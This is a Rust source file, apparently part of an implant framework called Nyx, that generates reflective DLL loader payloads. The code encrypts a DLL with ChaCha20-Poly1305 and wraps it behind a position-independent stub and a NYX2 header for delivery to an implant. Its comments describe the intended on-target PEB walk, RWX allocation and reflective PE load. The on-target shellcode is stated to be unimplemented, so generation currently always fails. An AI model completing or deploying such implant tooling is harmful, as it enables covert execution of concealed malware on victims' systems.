//! Nyx PIC reflective loader stub generator.
//!
//! This is a **host-side** library (std, build host) that generates the
//! shellcode blob for reflective DLL loading. It does NOT run on the implant —
//! it produces the PIC stub + encrypted DLL payload that the implant receives
//! and executes.
//!
//! ## Architecture
//!
//! ```text
//! build host                           target (implant)
//! ──────────                           ────────────────
//! dll_bytes ──► wrap_payload() ──► blob ──► implant receives blob
//!                 │                              │
//!                 ├─ encrypt DLL (ChaCha20-Poly1305)      │
//!                 ├─ prepend loader stub (when Layer 2    ▼
//!                 │    exists)                     execute stub
//!                 └─ append NYX2 header                  │
//!                                                         ▼
//!                                                    stub self-locates
//!                                                    finds NYX2 magic
//!                                                    reads len + nonce
//!                                                    decrypts (inline
//!                                                     ChaCha20-Poly1305)
//!                                                    reflectively loads PE
//!                                                    calls DllMain
//! ```
//!
//! **STATUS: the loader is NOT shippable yet.** The on-target Layer-2
//! shellcode (decrypt + reflective load) does not exist, so
//! [`generate_loader_stub`] and [`wrap_payload`] fail loudly with
//! [`LoaderError::Layer2Unavailable`] and no blob is emitted. The diagram
//! below is the intended end-state once a real Layer-2 lands (spec §5.3).
//!
//! ## Payload layout
//!
//! ```text
//! ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
//! │  loader stub │  NYX2 magic  │ encrypted_len│    nonce     │  ciphertext  │
//! │  (variable)  │   (4 bytes)  │  u32 LE (4B) │   (12 bytes) │  (N bytes)   │
//! └──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
//!                                                              │
//!                                                ┌──────────────┴──────────────┐
//!                                                │  Poly1305 tag (16 bytes)    │
//!                                                └─────────────────────────────┘
//! ```
//!
//! The loader stub length is `LAYER1_BOOTSTRAP.len() + 32 (key) + <Layer 2>`
//! — see [`on_target`] for the Layer-1 byte counts. **Layer 2 is not
//! implemented**, so [`generate_loader_stub`] and [`wrap_payload`] currently
//! fail with [`LoaderError::Layer2Unavailable`]; no blob can be emitted until
//! a real Layer-2 exists. Once it does, total payload size:
//! `stub_len + 4 + 4 + 12 + N + 16 = stub_len + 36 + N` bytes where
//! N = `dll_bytes.len()` (ChaCha20-Poly1305 ciphertext is same length as
//! plaintext).

pub mod dll_probe;
pub mod on_target;
pub mod peb_walk;
pub mod stub;

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Nonce,
};
use rand::RngCore;

// Re-export key constants for callers that need to reason about offsets.
pub use stub::{
    reflective_load, reflective_load_at, ImportResolver, MappedImage, ReflectiveLoadError,
    CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, NYX2_MAGIC, PIC_STUB_LEN, TAG_LEN,
};

// ── LoaderConfig ────────────────────────────────────────────────────────

/// Configuration for generating a reflective loader payload.
///
/// Holds the encryption key (32 bytes) and nonce (12 bytes) used to protect
/// the embedded DLL. If you call [`LoaderConfig::random`], both are filled
/// from the OS CSPRNG — the caller is responsible for exfiltrating them (e.g.
/// baking them into a per-implant config so the PIC stub can decrypt).
#[derive(Clone, Debug)]
pub struct LoaderConfig {
    /// ChaCha20-Poly1305 encryption key (32 bytes).
    pub key: [u8; 32],
    /// ChaCha20-Poly1305 nonce (12 bytes).
    pub nonce: [u8; 12],
}

impl LoaderConfig {
    /// Create a `LoaderConfig` with the given key and nonce.
    pub fn new(key: [u8; 32], nonce: [u8; 12]) -> Self {
        Self { key, nonce }
    }

    /// Generate a random key + nonce from the OS CSPRNG.
    ///
    /// The caller MUST persist these values somewhere the PIC stub can access
    /// (e.g. baked into per-implant config), otherwise the implant will be
    /// unable to decrypt the embedded DLL.
    pub fn random() -> Self {
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rngs::OsRng.fill_bytes(&mut key);
        rand::rngs::OsRng.fill_bytes(&mut nonce);
        Self { key, nonce }
    }
}

// ── Public API ──────────────────────────────────────────────────────────

/// Errors produced by the loader-stub emitter.
///
/// The only variant today is [`LoaderError::Layer2Unavailable`]: the
/// on-target Layer-2 shellcode (decrypt + reflective PE load) does not exist,
/// so the loader capability is deliberately not shippable. When a real
/// Layer-2 lands (spec §5.3), validation errors such as a key containing the
/// NYX2 magic can be added here.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum LoaderError {
    /// The Layer-2 on-target shellcode (PEB walk, RWX alloc, inline
    /// ChaCha20-Poly1305 decrypt, reflective PE load, `DllMain` call) is not
    /// implemented. The previous `LAYER2_PEB_WALK` bytes were a non-functional
    /// placeholder and were deleted; emitting a stub without them would ship a
    /// blob that cannot decrypt or load the DLL. No loader payload can be
    /// produced until a real, execution-validated Layer-2 exists.
    Layer2Unavailable,
}

impl core::fmt::Display for LoaderError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            Self::Layer2Unavailable => write!(
                f,
                "loader stub emission unavailable: the on-target Layer-2 shellcode \
                 (PEB walk + RWX alloc + inline ChaCha20-Poly1305 decrypt + reflective \
                 PE load + DllMain) is not implemented; the loader capability is not \
                 shippable until a real Layer-2 exists (spec §5.3)"
            ),
        }
    }
}

impl std::error::Error for LoaderError {}

/// Emit the raw position-independent x86-64 loader stub for `config`.
///
/// # Status: NOT SHIPPABLE
///
/// This function **always** returns [`LoaderError::Layer2Unavailable`]. The
/// on-target Layer-2 shellcode does not exist — the previous `LAYER2_PEB_WALK`
/// byte blob was a non-functional placeholder (fabricated offsets, placeholder
/// operands) and has been deleted. Emitting a stub without real Layer-2 bytes
/// would produce a blob that cannot decrypt or reflectively load anything, so
/// this function fails loudly instead of emitting a broken fragment.
///
/// ## When this will work
///
/// Once a real Layer-2 exists (spec §5.3, execution-validated by the VPS
/// loader probe, spec §5.5), this returns the full on-target shellcode:
/// Layer 1 (self-location, NYX2 magic scan, header parse) immediately
/// followed by Layer 2 (PEB walk, RWX alloc, inline ChaCha20-Poly1305,
/// reflective PE load, `DllMain` call). The 32-byte `config.key` is baked in
/// at [`on_target::KEY_PATCH_OFFSET`]; the 12-byte `config.nonce` is NOT
/// baked in here — it travels in the NYX2 header that [`wrap_payload`]
/// appends, so the same stub can be re-used with different nonces. The
/// `jmp rel32` at [`on_target::LAYER2_JMP_OFFSET`] is patched to land at the
/// first byte of Layer 2 (= `KEY_PATCH_OFFSET + KEY_LEN`).
pub fn generate_loader_stub(config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
    // Fail loudly: the loader capability is not shippable until a real
    // Layer-2 exists. Do NOT emit the Layer-1 prefix + key + placeholder
    // fragment — that would look like a working loader and fail on-target.
    let _ = config;
    Err(LoaderError::Layer2Unavailable)
}

/// Encrypt a DLL, prepend the loader stub, and assemble the full NYX2 payload.
///
/// # Layout
///
/// ```text
/// [loader stub (variable, key baked in)][NYX2 magic (4B)]
/// [encrypted_len u32 LE (4B)][nonce (12B)]
/// [ciphertext (dll_bytes.len() bytes)][Poly1305 tag (16B)]
/// ```
///
/// The loader stub is the per-config output of [`generate_loader_stub`] —
/// Layer 1 + Layer 2 with `config.key` baked in. `config.nonce` is carried in
/// the NYX2 header (so the same stub template can be re-used with different
/// nonces); the inline ChaCha20-Poly1305 routine reads it from there at
/// runtime.
///
/// # Arguments
///
/// * `dll_bytes` — the raw PE DLL to encrypt and wrap.
/// * `config` — the key and nonce for ChaCha20-Poly1305 encryption. The key
///   is baked into the emitted stub AND used to encrypt the DLL; the nonce is
///   placed in the NYX2 header AND used to encrypt (so the same nonce is read
///   by both the host-side encrypt and the on-target decrypt).
///
/// # Returns
///
/// **Currently always fails** with [`LoaderError::Layer2Unavailable`]: the
/// on-target Layer-2 shellcode does not exist, so no blob can be emitted (see
/// [`generate_loader_stub`]). Once Layer-2 lands, returns a `Vec<u8>`
/// containing the complete payload blob, ready to be delivered to the implant
/// as shellcode.
pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
    // 0. The stub gates the whole payload. Without a working Layer-2 the blob
    //    is unusable on-target, so fail before encrypting anything.
    let stub = generate_loader_stub(config)?;

    // 1. Encrypt the DLL with ChaCha20-Poly1305. The on-target inline decrypt
    //    routine uses the SAME (key, nonce) — key from the stub, nonce from
    //    the NYX2 header — so the ciphertext this produces is exactly what
    //    the stub will turn back into the plaintext PE.
    let cipher = ChaCha20Poly1305::new_from_slice(&config.key)
        .expect("ChaCha20Poly1305 key is always 32 bytes");
    let nonce = Nonce::from_slice(&config.nonce);
    let ciphertext = cipher
        .encrypt(nonce, dll_bytes)
        .expect("ChaCha20-Poly1305 encrypt is infallible");

    // ciphertext = plaintext || 16-byte Poly1305 tag
    // encrypted_len = dll_bytes.len() (ciphertext portion, excluding tag)
    let encrypted_len = dll_bytes.len() as u32;

    // 2. Assemble: stub + NYX2 header + ciphertext (includes tag)
    let mut payload = Vec::with_capacity(stub.len() + 4 + 4 + 12 + ciphertext.len());
    payload.extend_from_slice(&stub);

    // NYX2 magic (4 bytes, little-endian)
    payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());

    // encrypted_len (4 bytes, little-endian)
    payload.extend_from_slice(&encrypted_len.to_le_bytes());

    // nonce (12 bytes)
    payload.extend_from_slice(&config.nonce);

    // ciphertext || Poly1305 tag
    payload.extend_from_slice(&ciphertext);

    Ok(payload)
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid PE DLL header for testing (the stub doesn't parse it
    /// yet, but `wrap_payload` encrypts arbitrary bytes).
    fn dummy_dll() -> Vec<u8> {
        // Minimal PE: MZ header + PE signature + empty sections.
        // Just enough bytes to exercise the encrypt/wrap path.
        let mut dll = Vec::new();
        // MZ magic
        dll.extend_from_slice(b"MZ");
        // Padding to make a non-trivial test payload
        dll.extend_from_slice(&[0u8; 62]);
        // PE signature at offset 0x40
        dll.extend_from_slice(b"PE\0\0");
        // Padding
        dll.extend_from_slice(&[0u8; 128]);
        dll
    }

    /// The loader capability is NOT shippable: `generate_loader_stub` must
    /// fail loudly (return Err) instead of emitting a stub fragment, because
    /// no real Layer-2 on-target shellcode exists. This is the headline
    /// contract of the current loader status — a silent success here would
    /// ship a blob that cannot decrypt or load anything on-target.
    #[test]
    fn generate_loader_stub_fails_loudly_without_layer2() {
        let config = LoaderConfig::random();
        let err = generate_loader_stub(&config).expect_err(
            "generate_loader_stub must fail: Layer-2 shellcode is not implemented",
        );
        assert_eq!(err, LoaderError::Layer2Unavailable);
        // The error message must be actionable, not a bare enum name.
        let msg = err.to_string();
        assert!(
            msg.to_lowercase().contains("layer-2"),
            "error must explain the Layer-2 gap, got: {msg}"
        );
    }

    /// `wrap_payload` must propagate the stub failure — no blob may be
    /// emitted while the loader cannot actually load.
    #[test]
    fn wrap_payload_fails_loudly_without_layer2() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let err = wrap_payload(&dll, &config).expect_err(
            "wrap_payload must fail: it cannot emit a payload without a working loader stub",
        );
        assert_eq!(err, LoaderError::Layer2Unavailable);
    }

    /// `LoaderError` must be usable through the `std::error::Error` trait
    /// (callers format it alongside other error types).
    #[test]
    fn loader_error_implements_std_error() {
        fn takes_error<E: std::error::Error>(_e: &E) {}
        takes_error(&LoaderError::Layer2Unavailable);
        let _ = format!("{}", LoaderError::Layer2Unavailable);
    }

    #[test]
    fn random_config_produces_different_keys() {
        let c1 = LoaderConfig::random();
        let c2 = LoaderConfig::random();
        // Probability of collision is astronomically low
        assert_ne!(c1.key, c2.key);
    }

    /// `LoaderConfig::new` preserves the key/nonce verbatim (the emitter
    /// contract a future Layer-2 relies on).
    #[test]
    fn loader_config_new_preserves_key_and_nonce() {
        let key = [0xAAu8; 32];
        let nonce = [0xBBu8; 12];
        let config = LoaderConfig::new(key, nonce);
        assert_eq!(config.key, key);
        assert_eq!(config.nonce, nonce);
    }
}
